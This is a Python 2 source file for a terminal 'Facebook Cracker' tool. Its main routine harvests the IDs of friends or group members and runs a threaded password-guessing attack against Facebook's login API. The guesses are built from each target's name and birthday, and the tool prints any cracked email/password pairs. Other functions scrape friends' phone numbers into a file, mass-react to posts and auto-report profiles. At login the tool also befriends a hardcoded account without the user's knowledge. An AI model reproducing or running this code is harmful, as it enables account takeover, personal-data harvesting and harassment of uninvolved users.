import os, sys, time, datetime, random, hashlib, re, threading, json, getpass, urllib
from multiprocessing.pool import ThreadPool

try:
    import requests
except ImportError:
    os.system("pip2 install requests")
from requests.exceptions import ConnectionError
from mechanize import Browser

try:
    import mechanize
except ImportError:
    os.system("pip2 install mechanize")

reload(sys)
sys.setdefaultencoding('utf8')
br = mechanize.Browser()
br.set_handle_robots(False)
br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
br.addheaders = [('User-Agent', 'Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16')]
info = time.strftime("%S:%M:%H")

def quit():
    print '\x1b[1;91m[!] Program Closed'
    os.sys.exit()


def loading(z):
    for e in z + '\n':
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(0.01)

###########################################################################
#                              Color                                      #
###########################################################################


R = '\033[1;91m'
V = '\033[1;95m'
W = '\033[1;97m'
G = '\033[1;92m'
N = '\033[1;0m'
Y = '\033[1;93m'

good = "\033[1;32m[\033[1;36m+\033[1;32m]\033[0m"
bad = "\033[1;32m[\033[1;31m!\033[1;32m]\033[0m"
#word
success = "\033[1;32mSuccessful\033[0m"
failed = "\033[1;31mFailed\033[0m"


banner2 = """%s
    .___.__  __          .
    [__ [__)/  `._. _. _.;_/ _ ._.
    |   [__)\__.[  (_](_.| \(/,[
               %s v2.0 %s -  
    =====[ Facebook Cracker ]=====
         %s By Termux-Android-Hackers admin %s 
"""%(R,Y,V,G,N)
min
banner = """%s
    .___.__  __          .
    [__ [__)/  `._. _. _.;_/ _ ._.
    |   [__)\__.[  (_](_.| \(/,[ 
             %s  v 2.0
     %s 
"""%(R,Y,N)

def load():
    loading(G + '\r[*] Please Wait... \n')


back = 0
threads = []
berhasil = []
cekpoint = []
gagal = []
idfriends = []
idfromfriends = []
idmem = []
id = []
em = []
emfromfriends = []
hp = []
hpfromfriends = []
reaksi = []
reaksigrup = []
komen = []
listgrup = []

ids = ('ids.txt')


def login():
    os.system('clear')
    try:
        toket = open('login.txt', 'r')
        menu()
    except (KeyError, IOError):
        os.system('clear')
        print banner2
        print G+'    Login Your Facebook Account'+N
        id = raw_input( V + '    Email ' + R + ' > ' + W)
        pwd = getpass.getpass( V + '    Paswd ' + R + ' > ' + W)
        os.system('clear')
        load()
        try:
            br.open('https://m.facebook.com')
        except mechanize.URLError:
            print '\n\x1b[1;91m[!] Please Check your Connection!\n\n'+N
            exit()

        br._factory.is_html = True
        br.select_form(nr=0)
        br.form['email'] = id
        br.form['pass'] = pwd
        br.submit()
        url = br.geturl()
        if 'save-device' in url:
            try:
                sig = 'api_key=882a8490361da98702bf97a021ddc14dcredentials_type=passwordemail=' + id + 'format=JSONgenerate_machine_id=1generate_session_cookies=1locale=en_USmethod=auth.loginpassword=' + pwd + 'return_ssl_resources=0v=1.062f8ce9f74b12f84c123cc23437a4a32'
                data = {'api_key': '882a8490361da98702bf97a021ddc14d', 'credentials_type': 'password', 'email': id, 'format': 'JSON', 'generate_machine_id': '1', 'generate_session_cookies': '1', 'locale': 'en_US', 'method': 'auth.login', 'password': pwd, 'return_ssl_resources': '0', 'v': '1.0'}
                x = hashlib.new('md5')
                x.update(sig)
                a = x.hexdigest()
                data.update({'sig': a})
                url = 'https://api.facebook.com/restserver.php'
                r = requests.get(url, params=data)
                z = json.loads(r.text)
                zedd = open('login.txt', 'w')
                zedd.write(z['access_token'])
                zedd.close()
                print '\n[#] Login Successfully!!'
                requests.post('https://graph.facebook.com/me/friends?method=post&uids=gwimusa3&access_token=' + z['access_token'])
                os.system('xdg-open https://www.youtube.com/kaitolegion')
                time.sleep(1)
                menu()
            except requests.exceptions.ConnectionError:
                print R + '\n[!] Please Check your Connection'
                quit()

        if 'checkpoint' in url:
            print '\n\x1b[1;91m[!] \x1b[1;93mYour Account Has Been Checkpoint'
            os.system('rm -rf login.txt')
            time.sleep(1)
            quit()
        else:
            print '\n\x1b[1;91m[!] Login Failed!'
            os.system('rm -rf login.txt')
            time.sleep(1)
            login()


def menu():
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        os.system('clear')
        print R + '[!] Token not found'
        os.system('rm -rf login.txt')
        time.sleep(1)
        login()
    else:
        try:
            otw = requests.get('https://graph.facebook.com/me?access_token=' + toket)
            a = json.loads(otw.text)
            nama = a['name']
            id = a['id']
            ots = requests.get('https://graph.facebook.com/me/subscribers?access_token=' + toket)
            b = json.loads(ots.text)
            sub = str(b['summary']['total_count'])
        except KeyError:
            os.system('clear')
            os.system('rm -rf login.txt')
            time.sleep(1)
            login()
        except requests.exceptions.ConnectionError:
            print banner
            print '\x1b[1;91m[!]Please Check your Connection!'
            quit()

    os.system('clear')
    print banner
    print V+' Welcome'+N+' [ '+ G + nama + N+ ' ] '
    print R+15 * '-'+G+'[ \033[1;97mMenu'+N+G+' ]'+R+ 15* '-'+N
    print W + ' 1.' + G + ' Start Cracking'
    print W + ' 2.' + G + ' Dump Group ID\'s'
    print W + ' 3.' + G + ' Dump Phone Numbers'
    print W + ' 4.' + G + ' Profile Guard'
    print W + ' 5.' + G + ' Auto Reaction'
    print W + ' 6.' + G + ' Auto Report'
    print W + ' 7.' + G + ' Developer'
    print W + ' 8.' + G + ' Logout'
    print W + ' 0.' + R + ' Exit'
    print ''
    pilih()


def pilih():
    zedd = raw_input(G + '~@adapcsg ' + R + '\xe2\x96\xb6 ' + W)
    if zedd == '':
        print '\x1b[1;91m [!] Empty command'
        pilih()
    elif zedd == '1':
        super()
    elif zedd == '2':
        dumpg()
    elif zedd == '3':
        phone()
    elif zedd == '4':
        guard()
    elif zedd == '5':
        autoliker()
        time.sleep(5)
    elif zedd == '6':
        print 'Not Available Now'
        menu()
    elif zedd == '7':
        os.system('clear')
        print ' \033[1;93mRecoded : \033[1;92mMr.KaitoX\n \033[1;93mTeam : \033[1;92madapcsg  \n \033[1;93mFacebook : \033[1;92mhttps://facebook.com/kaitolegionofficial \n\033[1;93m Github : \033[1;92mhttps://www.github.com/mrkaitox \n\033[1;93m YouTube : \033[1;92mhttps://youtube.com/kaitolegion'
        print '\n'
        print G+' Special Greetz:'+V+' \n Infinite \n Ph.Osus \n Ph.Bloodz \n AnonPrixor \n P4r4site \n Aries \n Fox Blood \n Mr.M3ll0w \n s4yt4m5 \n XxJohnxX \n Scroider'
        raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
        menu()
    elif zedd == '8':
        os.system('rm -rf login.txt')
        quit()
    elif zedd == '0':
        os.system('clear')
        print G + 'Bye Bye Tool Love Your admin <3'+N
        raw_input(R + '[ ' + W + 'Quit' + R + ' ]' + N)
        quit()
    else:
        print R + ' [+] Wrong Command!'
        pilih()
       
###########################################################################
#                           Auto Report                                   #
###########################################################################

def report():
    try:
        os.system('clear')
        print banner
        id = raw_input(R+'[+]'+G+' Enter Target Id: '+W)
        my = ("https://m.facebook.com/"+id)
        url = my
        br.open(url)
        dray = raw_input(R+'[*] '+G+'Do You Want To Report \n'+R+'[+]'+G+' [y/yes] :\n'+ G +' RootSec ' + R + '\xe2\x96\xb6 ' + W)
        return rep()    
    except:
        menu()
         
def rep():
    x = open(ids,'r')
    y = x.read()
    if id in y:
        print (R+'.  Oops 405')
        time.sleep(1)
        time.sleep(R+'Error While Reporting the Id')
        time.sleep(1)
        return test1()
    else:         
        return test2()
       
def test1():
          _bs = br.response().read()
          bb=bs4.BeautifulSoup(_bs,
				features="html.parser"
			)
          if len(bb) !=0:              
              for x in bb.find_all("a",href=True):                  
                  if "rapid_report" in x["href"]:                      
                      _cadow = x["href"]                      
                      br.open(_cadow)
                      return test2()
          
def test2():
    try:
        br._factory.is_html=True
        br.select_form(nr=0)
        br.form["tag"] = ["profile_fake_account"]
        br.submit()
        return test3()
    except Exception as f:
        print (' [+] Bad404')
                
def test3():     
    try:         
        br._factory.is_html=True
        br.select_form(nr=0)
        br.form["action_key"] = ["FRX_PROFILE_REPORT_CONFIRMATION"]
        br.submit()
        return _test4()
    except Exception as f:         
        print ('    Bad405')
                 
def test4():     
    try:         
        br._factory.is_html=True
        br.select_form(nr=0)
        br.form["checked"] = ["yes"]
        br.submit()
        jj = open(ids,'w')
        jj.write(_id)
        print ''
        time.sleep(2)
        print (G+'[-]Reported ')
        time.sleep(1)
        exit()
    except Exception as f:         
        print ('    Bad406')
        
###########################################################################
#                           Auto Reaction                                 #
###########################################################################

        
def autoliker():
    os.system('clear')
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[1;91m[!] Token not found'
        os.system('rm -rf login.txt')
        time.sleep(1)
        login()

    os.system('clear')
    print banner
    print G+'1. \x1b[1;95mLike'
    print G+'2. \x1b[1;92mLove'
    print G+'3. \x1b[1;93mWow'
    print G+'4. \x1b[1;93mHaha'
    print G+'5. \x1b[1;94mSad'
    print G+'6. \x1b[1;91mAngry'
    print R+'0. \x1b[1;97mBack'
    react()


def react():
    global tipe
    kai = raw_input('\x1b[1;91m-\xe2\x96\xba\x1b[1;97m ')
    if kai == '':
        react()
    else:
        if kai == '1':
            tipe = 'LIKE'
            root()
        else:
            if kai == '2':
                tipe = 'LOVE'
                root()
            else:
                if kai == '3':
                    tipe = 'WOW'
                    root()
                else:
                    if kai == '4':
                        tipe = 'HAHA'
                        root()
                    else:
                        if kai == '5':
                            tipe = 'SAD'
                            root()
                        else:
                            if kai == '6':
                                tipe = 'ANGRY'
                                root()
                            else:
                                if kai == '0':
                                    menu()
                                else:
                                    print '\x1b[1;91m[\xe2\x9c\x96] \x1b[1;97m' + aksi + ' \x1b[1;91mTidak ada'
                                    react()


def root():
    os.system('clear')
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\033[1;91m[!] Token not found'
        os.system('rm -rf login.txt')
        time.sleep(1)
        login()
    else:
        os.system('clear')
        print banner
        print 10 * ' '+G+'[ Auto React ]\n'+N
        ide = raw_input('\x1b[1;91m[+] \x1b[1;92mID Target \x1b[1;91m:\x1b[1;97m ')
        limit = raw_input('\x1b[1;91m[!] \x1b[1;92mLimit \x1b[1;91m:\x1b[1;97m ')
        try:
            oh = requests.get('https://graph.facebook.com/' + ide + '?fields=feed.limit(' + limit + ')&access_token=' + toket)
            ah = json.loads(oh.text)
            loading('\x1b[1;91m[\xe2\x9c\xba] \x1b[1;92mPlease wait \x1b[1;97m...')
            print ''
            for a in ah['feed']['data']:
                y = a['id']
                reaksi.append(y)
                requests.post('https://graph.facebook.com/' + y + '/reactions?type=' + tipe + '&access_token=' + toket)
                print '\x1b[1;92m[\x1b[1;97m' + y[:10].replace('\n', ' ') + '... \x1b[1;92m] \x1b[1;97m' + tipe

            print
            print '\r\x1b[1;91m[+]\x1b[1;97m Result \x1b[1;96m' + str(len(reaksi))
            raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
            menu()
        except KeyError:
            print '\x1b[1;91m[!] Wrong ID'
            raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
            menu()
        except KeyboardInterrupt:
            menu()


###########################################################################
#                         Profile Guard                                   #
###########################################################################

def guard():
    global toket
    os.system('clear')
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print R+'[!] Token not found'
        os.system('rm -rf login.txt')
        time.sleep(1)
        login()

    os.system('clear')
    print banner
    print 10 * ' '+G+'[ Profile Guard ]\n'+N
    print G+'['+W+'01'+G+'] Enable'+N
    print G+'['+W+'02'+G+'] Disable'+N
    print R+'['+W+'00'+R+'] Back'+N
    print ''
    turn()
    
def turn():
    g = raw_input(G+'RootSec'+R+' \xe2\x96\xb6 '+W)
    if g == '1' or g == '01':
        On = 'true'
        gaz(toket, On)
    else:
        if g == '2' or g == '02':
            Off = 'false'
            gaz(toket, Off)
        else:
            if g == '0' or g == '00':
                menu()
            else:
                if g == '':
                    print R+'Can\'t be Empty'+N
                    turn()
                else:
                    print R+'Can\'t be Empty'+N
                    turn()

def get_userid(toket):
    url = 'https://graph.facebook.com/me?access_token=%s' % toket
    res = requests.get(url)
    uid = json.loads(res.text)
    return uid['id']


def gaz(toket, enable=True):
    id = get_userid(toket)
    data = 'variables={"0":{"is_shielded": %s,"session_id":"9b78191c-84fd-4ab6-b0aa-19b39f04a6bc","actor_id":"%s","client_mutation_id":"b0316dd6-3fd6-4beb-aed4-bb29c5dc64b0"}}&method=post&doc_id=1477043292367183&query_name=IsShieldedSetMutation&strip_defaults=true&strip_nulls=true&locale=en_US&client_country_code=US&fb_api_req_friendly_name=IsShieldedSetMutation&fb_api_caller_class=IsShieldedSetMutation' % (enable, str(id))
    headers = {'Content-Type': 'application/x-www-form-urlencoded', 'Authorization': 'OAuth %s' % toket}
    url = 'https://graph.facebook.com/graphql'
    res = requests.post(url, data=data, headers=headers)
    print res.text
    if '"is_shielded":true' in res.text:
        os.system('clear')
        print banner
        print ''
        print '\x1b[1;91m[\x1b[1;96m\xe2\x9c\x93\x1b[1;91m] \x1b[1;92mActivated'
        raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
        guard()
    else:
        if '"is_shielded":false' in res.text:
            os.system('clear')
            print banner
            print ''
            print '\x1b[1;91m[\x1b[1;96m\xe2\x9c\x93\x1b[1;91m] \x1b[1;91mDeactivated'
            raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
            guard()
        else:
            print '\x1b[1;91m[!] Error'
            menu()

###########################################################################
#                          Dump group id                                  #
###########################################################################
def dumpg():
    os.system('clear')
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[1;91m[!] Token not found'
        os.system('rm -rf login.txt')
        time.sleep(1)
        login()
    else:
        os.system('clear')
        print banner
        loading(' Please wait ...')
        print ''
        try:
            uh = requests.get('https://graph.facebook.com/me/groups?access_token=' + toket)
            group = json.loads(uh.text)
            for p in group['data']:
                nama = p['name']
                id = p['id']
                f = open('id.txt', 'w')
                listgrup.append(id)
                print G + '[+] Name ' + V + '-> ' + W + str(nama)
                print G + '[-] ID   ' + V + '-> ' + W + str(id)
                print ''

            print '\n[+] Total Groups : %s' % len(listgrup)
            f.close()
            raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
            menu()
        except (KeyboardInterrupt, EOFError):
            print '\x1b[1;91m[!] Stopped'
            raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
            menu()
        except KeyError:
            print '\x1b[1;91m[!] Group not found'
            raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
            menu()
        except requests.exceptions.ConnectionError:
            print '\x1b[1;91m[\xe2\x9c\x96] No connection'
            quit()
        except IOError:
            print '\x1b[1;91m[!] Error when creating file'
            raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
            menu()

###########################################################################
#                    Get all friends phone numbers                        #
###########################################################################
def phone():
	os.system('clear')
	try:
		toket=open('login.txt','r').read()
	except IOError:
		print"\033[1;91m[!] Token not found"
		os.system('rm -rf login.txt')
		time.sleep(1)
		login()
	try:
		os.mkdir('result')
	except OSError:
		pass
	try:
		os.system('clear')
		print banner2
		loading('\033[1;92m Getting friends mobile number ')
		url= "https://graph.facebook.com/me/friends?access_token="+toket
		r =requests.get(url)
		z=json.loads(r.text)
		bz = open('result/phone_number.txt','w')
		for n in z["data"]:
			x = requests.get("https://graph.facebook.com/"+n['id']+"?access_token="+toket)
			z = json.loads(x.text)
			try:
				hp.append(z['mobile_phone'])
				bz.write(z['mobile_phone'] + '\n')
				print ("\r\033[1;92m "+str(len(hp))+"\033[1;97m.\033[1;97m  \033[1;92m"+z['name']+" "+V+z['mobile_phone']+"\n"),;sys.stdout.flush();time.sleep(0.0001)
			except KeyError:
				pass
		bz.close()
		
		print '\r\033[1;91m[\033[1;96m?\033[1;91m] \033[1;92mSuccessfully get number \033[1;97m....'
		print"\r\033[1;91m[+] \033[1;92mTotal Number \033[1;91m: \033[1;97m%s"%(len(hp))
		done = raw_input("\r\033[1;91m[+] \033[1;92mSave file with name\033[1;91m :\033[1;97m ")
		os.rename('result/phone_number.txt','result/'+done)
		print("\r\033[1;91m[+] \033[1;92mFile saved \033[1;91m: \033[1;97mout/"+done)
		raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
		menu()
	except IOError:
		print"\033[1;91m[!] Error creating file"
		raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
		menu()
	except (KeyboardInterrupt,EOFError):
		print("\033[1;91m[!] Stopped")
		raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
		menu()
	except KeyError:
		print('\033[1;91m[!] Error')
		raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
		menu()
	except requests.exceptions.ConnectionError:
		print"\033[1;91m Please Check Your Connection"
		quit()

###########################################################################
#                          Start Cracking                                 #
###########################################################################
def super():
    global toket
    os.system('clear')
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[1;91m[!] Token not found'
        os.system('rm -rf login.txt')
        time.sleep(1)
        login()

    os.system('clear')
    print banner
    print W + ' 1.' + G + ' Cracked from friends Facebook'
    print W + ' 2.' + G + ' Cracked from Group Facebook'
    print W + ' 3.' + G + ' Cracked from File ID'
    print W + ' 0.' + R + ' Exit'
    print ''
    pilih_super()


def pilih_super():
    peak = raw_input(G + ' adapcsg\x1b[1;91m >\x1b[1;97m ')
    if peak == '':
        print '\x1b[1;91m[!] Empty command'
        pilih_super()
    elif peak == '1':
        os.system('clear')
        print banner
        loading(G + '[+] ' + V + 'Cracking Please Wait...')
        r = requests.get('https://graph.facebook.com/me/friends?access_token=' + toket)
        z = json.loads(r.text)
        for s in z['data']:
            id.append(s['id'])

    elif peak == '2':
        os.system('clear')
        print banner
        idg = raw_input('\x1b[1;91m[+] \x1b[1;92m Group ID  \x1b[1;91m:\x1b[1;97m ')
        try:
            r = requests.get('https://graph.facebook.com/group/?id=' + idg + '&access_token=' + toket)
            asw = json.loads(r.text)
            print '\x1b[1;91m[\x1b[1;96m\xe2\x9c\x93\x1b[1;91m] \x1b[1;92mName Group \x1b[1;91m:\x1b[1;97m ' + asw['name']
        except KeyError:
            print '\x1b[1;91m[!] Group not found'
            raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
            super()

        re = requests.get('https://graph.facebook.com/' + idg + '/members?fields=name,id&limit=999999999&access_token=' + toket)
        s = json.loads(re.text)
        for i in s['data']:
            id.append(i['id'])
    
    elif peak == '3':
    	os.system('clear')
    	try:
    		print banner
    		idlist = raw_input('\x1b[1;91m[+] \x1b[1;92m File ID  \x1b[1;91m:\x1b[1;97m')
    		for line in open(idlist, 'r').readlines():
    			id.append(line.strip())
    	except:
    		pass
    
    elif peak == '0':
        menu()
    else:
        print '\x1b[1;91m[\xe2\x9c\x96] \x1b[1;97m' + peak + ' \x1b[1;91mCan\'t be Empty'
        pilih_super()
    print G + '[+]' + V + ' Total ID \x1b[1;91m: \x1b[1;97m' + str(len(id))
    loading(G + '[=] Please wait \x1b[1;97m...\n')

    def main(arg):
        user = arg
        try:
            a = requests.get('https://graph.facebook.com/' + user + '/?access_token=' + toket)
            b = json.loads(a.text)
            # Password Guess 1
            pass1 = b['first_name'] + '123'
            data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
            q = json.load(data)
            if 'access_token' in q:
                print '\n\x1b[1;95m Email :\x1b[1;97m ' + user + ' \n\x1b[1;95m Password :\x1b[1;97m ' + pass1
            elif 'www.facebook.com' in q['error_msg']:
                print '\n\x1b[1;91m Email :\x1b[1;97m ' + user + ' \n\x1b[1;91m Password :\x1b[1;97m ' + pass1
            else:
            	# Password Guess 2
                pass2 = b['first_name'] + '12345'
                data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass2 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                q = json.load(data)
                if 'access_token' in q:
                    print '\n\x1b[1;95m Email :\x1b[1;97m ' + user + ' \n\x1b[1;95m Password :\x1b[1;97m ' + pass2
                elif 'www.facebook.com' in q['error_msg']:
                    print '\n\x1b[1;91m Email :\x1b[1;97m ' + user + ' \n\x1b[1;91m Password :\x1b[1;97m ' + pass2
                else:
                	# Password Guess 3
                    pass3 = b['last_name'] + '123'
                    data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass3 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                    q = json.load(data)
                    if 'access_token' in q:
                        print '\n\x1b[1;95m Email :\x1b[1;97m ' + user + ' \n\x1b[1;95m Password :\x1b[1;97m ' + pass3
                    elif 'www.facebook.com' in q['error_msg']:
                        print '\n\x1b[1;91m Email :\x1b[1;97m ' + user + ' \n\x1b[1;91m Password :\x1b[1;97m ' + pass3
                    else:
                    	# Password Guess 4
                        birth = b['birthday']
                        pass4 = birth.replace('/', '')
                        data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass4 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                        q = json.load(data)
                        if 'access_token' in q:
                            print '\n\x1b[1;95m Email :\x1b[1;97m ' + user + ' \n\x1b[1;95m Password :\x1b[1;97m ' + pass4
                        elif 'www.facebook.com' in q['error_msg']:
                            print '\n\x1b[1;91m Email :\x1b[1;97m ' + user + ' \n\x1b[1;91m Password :\x1b[1;97m ' + pass4
                        else:
                            # Password Guess 5
                            pass5 = b['last_name'] + '04'
                            data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass5 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                            q = json.load(data)
                            if 'access_token' in q:
                            	print '\n\x1b[1;95m Email :\x1b[1;97m ' + user + ' \n\x1b[1;95m Password :\x1b[1;97m ' + pass5
                            elif 'www.facebook.com' in q['error_msg']:
                            	print '\n\x1b[1;91m Email :\x1b[1;97m ' + user + ' \n\x1b[1;91m Password :\x1b[1;97m ' + pass5
                            else:
                            	# Password Guess 6
                            	pass6 = b['first_name'] + '04'
                                data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass6 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                q = json.load(data)
                                if 'access_token' in q:
                                	print '\n\x1b[1;95m Email :\x1b[1;97m ' + user + ' \n\x1b[1;95m Password :\x1b[1;97m ' + pass6
                                elif 'www.facebook.com' in q['error_msg']:
                            	    print '\n\x1b[1;91m Email :\x1b[1;97m ' + user + ' \n\x1b[1;91m Password :\x1b[1;97m ' + pass6
                                else:
                                	pass
                            		
        except:
            pass

    p = ThreadPool(30)
    p.map(main, id)
    print '\n\x1b[1;91m[+] \x1b[1;97mFinish'
    raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
    super()



if __name__ == '__main__':
    login()